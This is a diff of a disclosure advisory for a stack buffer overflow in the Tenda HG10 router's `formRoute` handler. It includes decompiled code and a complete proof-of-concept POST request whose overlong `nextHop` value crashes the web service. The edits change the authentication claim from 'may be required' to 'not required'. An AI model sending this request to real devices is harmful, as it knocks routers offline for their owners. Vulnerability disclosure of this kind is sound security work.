@@ -1,41 +1,44 @@
-# Information
+# TENDA HG10: Stack-Based Buffer Overflow (CWE-121) in `formRoute` (`formRouting` / `nextHop`)
 
 ## Summary
 
-**Title:**   
-TENDA HG10 Stack-Based Buffer Overflow in `formRoute` via the `nextHop` parameter
+TENDA HG10 web management interface (`formRoute` / `boaform/formRouting`) is vulnerable to a stack-based buffer overflow via an overly long `nextHop` parameter, allowing an unauthenticated attacker to crash the Boa service or potentially achieve arbitrary code execution.
 
-**Vendor:** TENDA
+## Impact
 
-**Product:** TENDA HG10 AC1200 Dual-Band Wi-Fi xPON ONT
+- **Impact type:** Denial of Service (DoS) of Boa web service; potential Remote Code Execution (RCE) via stack corruption
+- **Authentication required:** not required
+- **Privilege:** root (Boa process runs with elevated privileges on the device)
+- **User interaction:** not required
 
-**Vulnerability Type:**  Stack-Based Buffer Overflow (CWE‑121)
+## Affected Products
 
-**Impact:**   
-Remote stack corruption via the web management interface. Denial of service was verified, and the stack overwrite may also enable arbitrary code execution if control data is successfully hijacked.
+- **Vendor:** TENDA
+- **Product:** TENDA HG10 AC1200 Dual-Band Wi-Fi xPON ONT
+- **Vulnerability type:** Stack-Based Buffer Overflow (CWE-121)
 
-## Affected Products and Versions
+### Tested vulnerable firmware
 
-**Confirmed affected model:**
+- HG7_HG9_HG10re_300001138_en_xpon
 
-- TENDA HG10
-
-**Tested / observed vulnerable firmware versions:**
-
-- US_HG7_HG9_HG10re_300001138_en_xpon
-
-**Firmware download page (for reference):**   
+**Firmware download address:**  
 https://www.tendacn.com/material/show/105719
 
-> The vulnerability was verified on firmware version US_HG7_HG9_HG10re_300001138_en_xpon
+> The vulnerability was verified on firmware version HG7_HG9_HG10re_300001138_en_xpon
 
-## Overview
+## Attack Vector
+
+- **Entry point:** `POST /boaform/formRouting`
+- **Handler selector:** `formRoute` (via `boaGetVar` reading the `nextHop` parameter)
+- **Injection parameter:** `nextHop`
+- **Authentication:** not required
+- **User interaction:** not required
+
+## Technical Details
 
 The Boa web management component in TENDA HG10 exposes a route-handling interface associated with `formRoute` and reachable through `/boaform/formRouting`. During request processing, the handler reads the user-controlled `nextHop` parameter by calling `boaGetVar(...)` and then copies that value into a stack-based buffer with `strcpy(...)`.
 
 The root cause is the absence of any effective length validation or truncation before the copy operation. The destination object is the stack buffer `v67`, which is shown in the decompiled code as `DWORD v67[5]`. Because the buffer is only 20 bytes long, an attacker can supply an overlong `nextHop` value and overflow the stack frame, causing the Boa service to crash. Based on the nature of the overwrite, further exploitation for arbitrary code execution cannot be excluded.
-
-## Vulnerability Details
 
 The vulnerable function (from the router’s firmware, decompiled) is:
 
@@ -54,33 +57,34 @@ v80[2] = v67;
 strcpy(v67, v16);
 ```
 
-Decompiled evidence showing attacker-controlled input acquisition and the unsafe copy:
-
 ![Decompiled code showing `boaGetVar` for `nextHop` followed by `strcpy`](images/image-20260403163856-gr28fpr.png)
-
-Decompiled stack layout showing that `v67` is a stack buffer:
 
 ![Decompiled stack variable layout showing `v67`](images/image-20260403164005-fh7yo5i.png)
 
+The vulnerability flow — numbered steps:
+
 1. **Unvalidated external input**  
-   The handler obtains the `nextHop` value directly from the incoming HTTP request through `boaGetVar(a1, (int)"nextHop", (int)"")`. **Command string construction**  
+   The handler obtains the `nextHop` value directly from the incoming HTTP request through `boaGetVar(a1, (int)"nextHop", (int)"")`.
+
+2. **Command string construction**  
    The externally controlled `nextHop` string is assigned to `v16` and then copied into `v67` with `strcpy(v67, v16);`. Because `v67` is declared as `DWORD v67[5]`, the destination storage is limited to 20 bytes, while `strcpy` performs an unbounded copy until a NUL terminator is reached.
-   
+
 3. **Execution with system‑level privileges**  
    The vulnerable operation occurs inside the router’s Boa management process. A successful overwrite therefore affects a privileged device management context; in testing, the immediate result was a crash of the management service, and a sufficiently controlled overwrite could have broader security impact.
 
-Overall, this matches **CWE‑121: Stack-based Buffer Overflow** .
+Overall, this matches **CWE‑121: Stack-based Buffer Overflow**.
 
-## Attack Scenario and Exploitability
+## Proof of Concept (PoC)
 
-### Preconditions
+### Steps to reproduce
 
-- Network reachability to the device’s Boa web management interface.
-- Ability to submit a crafted POST request to `/boaform/formRouting` using an overlong `nextHop` value. Depending on deployment and access-control configuration, administrative access to the web interface may be required.
+1. Connect to the TENDA HG10 web management interface (no authentication required).
+2. Send a crafted POST request to `/boaform/formRouting` with an excessively long `nextHop` parameter (over 20 bytes) to overflow the stack buffer `v67`.
+3. Observe that the Boa service crashes and the administrative web interface becomes unreachable.
 
-### Example Exploit (PoC)
+### Example request
 
-The following proof-of-concept request supplies an excessively long `nextHop` parameter to trigger the stack overflow in the `formRoute` handler:
+Sends an overlong `nextHop` value (100+ bytes) to overflow the 20-byte stack buffer `v67` in `formRoute`.
 
 ```http
 POST /boaform/formRouting HTTP/1.1
@@ -100,14 +104,10 @@ Priority: u=0, i
 destNet=1.1.1.0&subMask=255.255.255.0&interface=1&nextHop=00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001.1.1.1&addRoute=1&submit-url=/route.asp
 ```
 
-Captured request showing the crafted `nextHop` payload and the lack of a normal response:
+### Verification
 
-![Proof-of-concept request and empty response](images/image-20260403164144-s3tjis6.png)
+**Raw HTTP request**:
+![](images/image-20260403164144-s3tjis6.png)
 
-### Verification of Exploit
-
-To verify the issue, send the crafted POST request shown above to the vulnerable device. In the supplied test results, the server stopped responding after the request was sent. A subsequent attempt to access the administrative web interface failed, indicating that the Boa service had crashed as a result of the overflow condition.
-
-Observed post-exploitation behavior: the administrative web interface became unreachable after the malicious request was processed.
-
-![Administrative interface unreachable after triggering the overflow](images/image-20260403164207-9u6iytj.png)
+**Observed result**:
+![](images/image-20260403164207-9u6iytj.png)
